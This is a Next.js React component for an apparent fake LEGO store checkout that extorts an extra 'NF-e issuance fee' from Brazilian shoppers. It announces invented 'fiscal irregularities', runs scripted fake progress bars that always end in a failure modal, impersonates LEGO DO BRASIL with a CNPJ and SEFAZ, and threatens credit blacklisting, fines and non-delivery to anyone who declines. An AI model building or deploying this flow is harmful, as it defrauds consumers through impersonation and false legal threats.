"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"

interface UpsellData {
  img: string
  title: string
  price: string
  orderNo: string
  productId: string
  customerEmail: string
}

export default function UpsellFlow() {
  const router = useRouter()
  const [currentView, setCurrentView] = useState<"orders" | "loading" | "upsell" | "nfeMaking">("orders")
  const [showErrorModal, setShowErrorModal] = useState(false)
  const [showDeclinePush, setShowDeclinePush] = useState(false)
  const [loadingProgress, setLoadingProgress] = useState(0)
  const [nfeProgress, setNfeProgress] = useState(0)
  const [activeSteps, setActiveSteps] = useState<number[]>([])
  const [activeFields, setActiveFields] = useState<number[]>([])
  const [upsellData, setUpsellData] = useState<UpsellData>({
    img: "",
    title: "",
    price: "",
    orderNo: "",
    productId: "",
    customerEmail: "",
  })

  const loadingRef = useRef<number>()
  const nfeRef = useRef<number>()

  useEffect(() => {
    const checkoutData = localStorage.getItem("checkout-data")
    const productData = localStorage.getItem("product-data")

    if (checkoutData && productData) {
      const checkout = JSON.parse(checkoutData)
      const product = JSON.parse(productData)

      setUpsellData({
        img: product.image || "",
        title: product.name || " ",
        price: product.price || "",
        orderNo: checkout.orderId || "#" + Math.floor(1000 + Math.random() * 9000),
        productId: product.id || "",
        customerEmail: checkout.email || "",
      })
    } else {
      const orderNo = "#" + Math.floor(1000 + Math.random() * 9000)
      setUpsellData({
        img: "",
        title: " ",
        price: "",
        orderNo,
        productId: "",
        customerEmail: "",
      })
    }
  }, [])

  const formatPrice = (cents: string) => {
    if (!cents || isNaN(Number(cents))) return "—"
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(Number(cents) / 100)
  }

  const handleOrderClick = () => {
    setCurrentView("loading")
    setLoadingProgress(0)
    setActiveSteps([])

    const startTime = Date.now()
    const duration = 8000

    const animate = () => {
      const elapsed = Date.now() - startTime
      const progress = Math.min(elapsed / duration, 1)
      setLoadingProgress(progress * 100)

      if (progress < 1) {
        loadingRef.current = requestAnimationFrame(animate)
      } else {
        setCurrentView("upsell")
      }
    }

    loadingRef.current = requestAnimationFrame(animate)

    const stepTimes = [0, 2000, 4000, 6000]
    stepTimes.forEach((time, index) => {
      setTimeout(() => {
        setActiveSteps((prev) => [...prev, index])
      }, time)
    })
  }

  const handleAcceptNfe = () => {
    sessionStorage.setItem("upsell_nfe_selected", "1")
    setCurrentView("nfeMaking")
    startNfeMaking()
  }

  const handleDeclineNfe = () => {
    sessionStorage.setItem("upsell_nfe_selected", "0")
    setShowDeclinePush(true)
  }

  const startNfeMaking = () => {
    setNfeProgress(0)
    setActiveFields([])

    const fieldTimes = [800, 2000, 3200, 4400, 5600]
    fieldTimes.forEach((time, index) => {
      setTimeout(() => {
        setActiveFields((prev) => [...prev, index])
      }, time)
    })

    const startTime = Date.now()
    const duration = 12500

    const animate = () => {
      const elapsed = Date.now() - startTime
      const progress = Math.min(elapsed / duration, 0.98)
      setNfeProgress(progress * 100)

      if (progress < 0.98) {
        nfeRef.current = requestAnimationFrame(animate)
      } else {
        setShowErrorModal(true)
      }
    }

    nfeRef.current = requestAnimationFrame(animate)
  }

  useEffect(() => {
    return () => {
      if (loadingRef.current) cancelAnimationFrame(loadingRef.current)
      if (nfeRef.current) cancelAnimationFrame(nfeRef.current)
    }
  }, [])

  return (
    <div className="max-w-3xl mx-auto p-3">
      {currentView === "orders" && (
        <div>
          <div className="flex items-center gap-2 font-bold text-xs text-gray-600 uppercase tracking-wider mb-2">
            <div className="w-2 h-2 rounded-full bg-red-600 shadow-lg shadow-red-200"></div>
            PEDIDOS LEGO STORE
          </div>

          <button
            onClick={handleOrderClick}
            className="w-full flex gap-3 items-center rounded-2xl p-3 bg-gradient-to-r from-red-50 to-transparent hover:shadow-lg transition-all duration-200 active:translate-y-0.5"
          >
            <div className="w-7 h-7 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-sm flex items-center justify-center">
              !
            </div>
            <div className="w-16 h-16 rounded-2xl overflow-hidden bg-gray-100 shadow-md">
              <img
                src={upsellData.img || "/placeholder.svg"}
                alt="Produto LEGO"
                className="w-full h-full object-cover"
              />
            </div>
            <div className="flex-1 text-left">
              <div className="flex items-center gap-2 flex-wrap">
                <div className="font-black text-base truncate">{upsellData.title}</div>
                <div className="text-xs bg-gray-100 rounded-full px-2 py-1 font-bold text-gray-600">
                  {upsellData.orderNo}
                </div>
                <div className="text-xs font-black text-red-800 bg-red-100 rounded-full px-2 py-1">
                  {formatPrice(upsellData.price)}
                </div>
              </div>
              <div className="text-xs text-red-800 font-semibold mt-1">
                Há inconformidades fiscais identificadas no seu pedido LEGO. Clique para verificar e regularizar.
              </div>
            </div>
          </button>
        </div>
      )}

      {currentView === "loading" && (
        <div className="rounded-2xl p-4 bg-gradient-to-r from-purple-50 to-transparent shadow-lg">
          <div className="flex gap-3 items-center mb-4">
            <div className="w-14 h-14 rounded-2xl overflow-hidden bg-gray-100 shadow-md">
              <img
                src={upsellData.img || "/placeholder.svg"}
                alt="Produto LEGO"
                className="w-full h-full object-cover"
              />
            </div>
            <div>
              <div className="font-black text-base">{upsellData.title}</div>
              <div className="text-xs text-gray-500">Pedido {upsellData.orderNo}</div>
            </div>
          </div>

          <div className="flex items-center gap-3 mb-4">
            <div className="flex-1 h-3 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-purple-600 to-purple-700 transition-all duration-300 ease-linear"
                style={{ width: `${loadingProgress}%` }}
              />
            </div>
            <div className="text-xs text-gray-600 font-mono min-w-9 text-right">{Math.round(loadingProgress)}%</div>
          </div>

          <ul className="space-y-2">
            {[
              "Validando pagamento...",
              "Pagamento confirmado ✓",
              "Sincronizando com a operadora...",
              "Gerando pré‑protocolo...",
            ].map((step, index) => (
              <li
                key={index}
                className={`flex items-center gap-2 text-sm transition-all duration-300 ${
                  activeSteps.includes(index) ? "opacity-100 translate-y-0" : "opacity-25 translate-y-1"
                }`}
              >
                <div className="w-2 h-2 rounded-full bg-purple-600"></div>
                <span>{step}</span>
              </li>
            ))}
          </ul>
        </div>
      )}

      {currentView === "upsell" && (
        <div className="rounded-3xl p-5 bg-gradient-to-r from-red-50 to-transparent shadow-xl space-y-5">
          <div className="flex gap-4 items-center flex-wrap">
            <div className="w-16 h-16 rounded-2xl overflow-hidden shadow-lg">
              <img
                src={upsellData.img || "/placeholder.svg"}
                alt="Produto LEGO"
                className="w-full h-full object-cover"
              />
            </div>
            <div className="flex-1">
              <div className="text-xs font-black text-red-700 uppercase tracking-wider">
                Documento fiscal obrigatório
              </div>
              <h2 className="text-2xl font-black text-gray-900 leading-tight">Emissão de Nota Fiscal (NF‑e)</h2>
              <div className="text-sm text-gray-600">
                Para o pedido LEGO: <strong>{upsellData.title}</strong>
              </div>
            </div>
          </div>

          <div className="grid gap-5 lg:grid-cols-2 lg:items-start">
            <div className="space-y-3">
              {[
                "Validação automatizada junto à SEFAZ para produtos LEGO.",
                "Envio do XML e DANFE por e‑mail cadastrado.",
                "Chave de acesso e suporte fiscal especializado.",
                "Garantia de conformidade fiscal para importados.",
              ].map((benefit, index) => (
                <div key={index} className="flex gap-3 items-start text-sm text-gray-700">
                  <div className="w-5 h-5 rounded-md bg-gradient-to-br from-red-600 to-red-700 flex-shrink-0 relative">
                    <div className="absolute left-1 top-0.5 w-2 h-2 border-r-2 border-b-2 border-white transform rotate-45"></div>
                  </div>
                  <span>{benefit}</span>
                </div>
              ))}
            </div>

            <div className="rounded-2xl p-4 bg-gradient-to-b from-white/60 to-white/20 shadow-lg space-y-3">
              <div className="flex gap-3 flex-wrap justify-center">
                <button
                  onClick={handleAcceptNfe}
                  className="px-6 py-3 bg-gradient-to-r from-red-600 to-red-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5 min-w-44"
                >
                  Emitir NF‑e agora
                </button>
                <button
                  onClick={handleDeclineNfe}
                  className="px-6 py-3 bg-gray-100 text-gray-800 font-black text-sm rounded-xl hover:bg-gray-200 transition-all duration-200 active:translate-y-0.5 min-w-44"
                >
                  Continuar sem NF‑e
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {currentView === "nfeMaking" && (
        <div className="rounded-3xl p-5 bg-gradient-to-r from-purple-50 to-white shadow-xl space-y-4">
          <div>
            <h3 className="text-xl font-black text-gray-900">Gerando NF‑e</h3>
            <div className="text-xs text-gray-500">A emissão será concluída após a verificação.</div>
          </div>

          <div className="grid gap-4 lg:grid-cols-2">
            <div className="rounded-2xl p-3 bg-gray-50 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-purple-700">Preenchendo dados</h4>
              <div className="space-y-2">
                {[
                  { label: "Emitente", value: "LEGO DO BRASIL" },
                  { label: "CNPJ", value: "18.844.479/0001-08" },
                  { label: "NCM/CFOP", value: "8517.62.99 / 5102" },
                  { label: "Transmissão", value: "SEFAZ Estadual" },
                ].map((field, index) => (
                  <div
                    key={index}
                    className={`flex justify-between items-center text-sm transition-all duration-500 ${
                      activeFields.includes(index) ? "opacity-100 translate-y-0" : "opacity-15 translate-y-1"
                    }`}
                  >
                    <span className="text-gray-500 text-xs">{field.label}</span>
                    <span className="font-bold text-gray-900">{field.value}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="rounded-2xl p-3 bg-gray-50 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-purple-700">Resumo</h4>
              <div className="flex gap-3 items-center">
                <div className="w-14 h-14 rounded-2xl overflow-hidden bg-gray-100 shadow-md">
                  <img
                    src={upsellData.img || "/placeholder.svg"}
                    alt="Produto "
                    className="w-full h-full object-cover"
                  />
                </div>
                <div>
                  <div className="font-black text-sm">{upsellData.title}</div>
                  <div className="text-purple-700 font-black text-sm">{formatPrice(upsellData.price)}</div>
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span>Concluindo emissão da NF‑e</span>
                  <span className="font-mono text-gray-600">{Math.round(nfeProgress)}%</span>
                </div>
                <div className="h-3 bg-gray-200 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-purple-600 to-purple-700 transition-all duration-300 ease-linear"
                    style={{ width: `${nfeProgress}%` }}
                  />
                </div>
              </div>
            </div>
          </div>

          <div className="flex justify-center">
            <a
              href="/pagamento-taxa-nfe"
              className="px-6 py-3 bg-gradient-to-r from-purple-600 to-purple-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5 min-w-44"
            >
              Ir para pagamento
            </a>
          </div>
        </div>
      )}

      {showErrorModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="w-full max-w-lg rounded-2xl p-5 bg-gradient-to-b from-white to-gray-50 shadow-2xl space-y-4 animate-in fade-in zoom-in-95 duration-200">
            <div className="flex gap-3 items-center">
              <div className="w-14 h-14 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-3xl flex items-center justify-center animate-pulse">
                !
              </div>
              <div>
                <h3 className="text-lg font-black text-red-800">Não foi possível concluir a emissão</h3>
                <div className="text-xs text-gray-500">A emissão foi interrompida antes da autorização</div>
              </div>
            </div>

            <div className="text-sm text-gray-700">
              Para emitir a nota fiscal é necessário pagar a taxa de emissão. Caso não efetue o pagamento, poderão
              ocorrer consequências graves:
              <ul className="mt-2 ml-4 space-y-1 list-disc">
                <li>Inscrição do nome no SERASA/órgãos de proteção ao crédito</li>
                <li>Aplicação de multa por irregularidade fiscal</li>
                <li>Impossibilidade de receber o produto</li>
              </ul>
            </div>

            <div className="flex justify-center">
              <a
                href="/pagamento-taxa-nfe"
                className="px-6 py-3 bg-gradient-to-r from-red-500 to-red-600 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
              >
                Pagar taxa de emissão
              </a>
            </div>
          </div>
        </div>
      )}

      {showDeclinePush && (
        <div className="fixed bottom-3 left-1/2 transform -translate-x-1/2 w-full max-w-3xl z-40 px-4 animate-in slide-in-from-bottom duration-300">
          <div className="rounded-2xl p-4 bg-gradient-to-b from-white to-gray-50 shadow-2xl space-y-3">
            <div className="flex gap-3 items-center">
              <div className="w-9 h-9 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-lg flex items-center justify-center">
                !
              </div>
              <h4 className="font-black text-red-800">Atenção: continuar sem NF‑e pode gerar penalidades</h4>
            </div>

            <div className="text-sm text-gray-700">
              Caso você opte por não pagar a taxa e não emitir a NF‑e, poderá haver inscrição do nome em órgãos de
              proteção ao crédito, multas e impedimento da entrega do produto.
            </div>

            <div className="flex gap-3 flex-wrap justify-center">
              <button
                onClick={() => {
                  setShowDeclinePush(false)
                  handleAcceptNfe()
                }}
                className="px-4 py-2 bg-gradient-to-r from-purple-600 to-purple-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
              >
                Ir para pagamento
              </button>
              <button
                onClick={() => setShowDeclinePush(false)}
                className="px-4 py-2 bg-gray-100 text-gray-800 font-black text-sm rounded-xl hover:bg-gray-200 transition-all duration-200 active:translate-y-0.5"
              >
                Continuar sem NF‑e
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
